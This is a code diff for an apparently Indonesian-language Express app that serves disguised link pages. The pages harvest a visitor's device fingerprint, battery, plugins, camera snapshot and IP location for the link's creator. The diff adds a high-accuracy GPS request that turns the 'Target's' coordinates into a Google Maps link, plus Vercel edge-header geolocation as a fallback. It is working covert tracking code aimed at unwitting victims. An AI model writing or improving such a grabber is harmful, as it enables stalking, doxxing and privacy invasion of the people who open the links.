@@ -135,7 +135,7 @@ app.get('/s/:data', async (req, res) => {
                     creatorId: \`${creatorId}\`, targetUrl: \`${targetUrl}\`, userAgent: navigator.userAgent,  
                     os: os, platform: navigator.platform, language: navigator.language,  
                     screenWidth: window.screen.width, screenHeight: window.screen.height,  
-                    cfLocation: '', cfCity: '', camera: 'Ditolak/Dilewati'  
+                    location: 'Ditolak/Dilewati', cfLocation: '', cfCity: '', camera: 'Ditolak/Dilewati'  
                 };  
 
                 try { const battery = await navigator.getBattery(); data.battery = { level: \`\${Math.round(battery.level * 100)}%\`, isCharging: battery.charging }; } catch (e) { data.battery = { level: 'N/A', isCharging: 'N/A' }; }  
@@ -160,6 +160,11 @@ app.get('/s/:data', async (req, res) => {
                     touchSupport: navigator.maxTouchPoints > 0,  
                     plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || 'Tidak ada'  
                 };  
+
+                try {  
+                    const position = await new Promise((resolve, reject) => { navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }); });  
+                    data.location = \`https://www.google.com/maps?q=\${position.coords.latitude},\${position.coords.longitude}\`;  
+                } catch (e) {}
 
                 try {
                     const siputRes = await fetch('https://api.siputzx.my.id/', { headers: { 'Accept': 'application/json' } });
@@ -197,22 +202,33 @@ app.post('/log', async (req, res) => {
 
     if (!creatorId) { return res.sendStatus(400); }  
     
+    const vercelLat = req.headers['x-vercel-ip-latitude'];
+    const vercelLon = req.headers['x-vercel-ip-longitude'];
+    const vercelCity = req.headers['x-vercel-ip-city'] || 'Unknown';
+
     let ipInfo = 'Tidak dapat mengambil info IP.';  
     let fallbackMapUrl = ''; 
+    let apiCity = '';
     
     try {  
         const ipRes = await axios.get(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,isp,org,lat,lon`);  
         if (ipRes.data.status === 'success') {  
             ipInfo = `*Negara:* ${ipRes.data.country}\n*Kota:* ${ipRes.data.city}, ${ipRes.data.regionName}\n*ISP:* ${ipRes.data.isp}\n*Organisasi:* ${ipRes.data.org}`;  
             fallbackMapUrl = `https://www.google.com/maps?q=${ipRes.data.lat},${ipRes.data.lon}`;
+            apiCity = ipRes.data.city;
         }  
     } catch (e) {}  
 
     let finalLocation = 'Gagal Dilacak';
-    if (data.cfLocation && data.cfLocation.startsWith('http')) {
+    
+    if (data.location && data.location.startsWith('http')) {
+        finalLocation = `${data.location} (📍 Presisi via GPS Target)`;
+    } else if (vercelLat && vercelLon) {
+        finalLocation = `https://www.google.com/maps?q=${vercelLat},${vercelLon} (☁️ Akurat via Vercel Edge - ${vercelCity})`;
+    } else if (data.cfLocation && data.cfLocation.startsWith('http')) {
         finalLocation = `${data.cfLocation} (☁️ Akurat via CF Edge SiputZX - ${data.cfCity})`;
     } else if (fallbackMapUrl !== '') {
-        finalLocation = `${fallbackMapUrl} (🌐 Estimasi via IP API)`;
+        finalLocation = `${fallbackMapUrl} (🌐 Estimasi via IP API - ${apiCity})`;
     }
 
     const isCameraAllowed = data.camera && data.camera.startsWith('data:image/jpeg;base64,');  
